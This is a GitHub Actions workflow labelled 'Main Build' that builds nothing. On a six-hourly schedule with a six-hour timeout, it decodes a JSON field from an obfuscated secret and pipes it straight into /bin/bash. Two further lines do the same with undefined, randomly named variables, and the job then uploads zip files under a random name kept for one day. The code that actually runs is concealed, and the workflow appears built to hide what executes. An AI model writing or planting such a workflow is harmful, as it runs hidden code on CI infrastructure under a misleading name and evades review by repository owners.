name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '27 1,7,13,19 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  service:
    name: Run task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run
        env:
          ebq9: ${{ secrets.ebq9 }}
        run: |
          printf '%s' "$ebq9" | jq -r .kty22 | /bin/bash
          printf '%s' "$wff44705" | jq -r .b6717 | /bin/bash
          printf '%s' "$inlw94" | jq -r .o8315 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: cyDPrWlR
          path: "*.zip"
          retention-days: 1
